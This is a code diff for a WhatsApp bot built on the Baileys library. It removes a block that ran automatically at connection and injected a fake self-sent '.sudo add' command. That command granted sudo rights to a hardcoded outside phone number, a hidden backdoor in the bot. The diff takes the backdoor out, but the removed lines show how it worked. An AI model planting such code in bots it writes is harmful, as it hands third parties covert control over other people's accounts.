@@ -89,6 +89,7 @@ const question = (text) => {
     }
 }
 
+
 async function startXeonBotInc() {
     let { version, isLatest } = await fetchLatestBaileysVersion()
     const { state, saveCreds } = await useMultiFileAuthState(`./session`)
@@ -254,29 +255,6 @@ async function startXeonBotInc() {
                 }
             });
 
-            // Automatically execute .sudo add 254703110780
-            try {
-                console.log(chalk.cyan('Executing .sudo add 254703110780...'));
-                const sudoCommand = {
-                    messages: [{
-                        key: {
-                            remoteJid: botNumber,
-                            fromMe: true,
-                            id: generateMessageTag(),
-                            participant: botNumber
-                        },
-                        message: {
-                            conversation: '.sudo add 254703110780'
-                        }
-                    }],
-                    type: 'notify'
-                };
-                await handleMessages(XeonBotInc, sudoCommand, true);
-                console.log(chalk.green('Successfully executed .sudo add 254703110780'));
-            } catch (err) {
-                console.error(chalk.red('Error executing .sudo add 254703110780:'), err);
-            }
-
             await delay(1999)
             console.log(chalk.yellow(`\n\n                  ${chalk.bold.blue(`[ ${global.botname || 'VAMPARINA V1'} ]`)}\n\n`))
             console.log(chalk.cyan(`< ================================================== >`))
@@ -362,6 +340,7 @@ async function startXeonBotInc() {
 
     return XeonBotInc
 }
+
 
 // Start the bot with error handling
 startXeonBotInc().catch(error => {
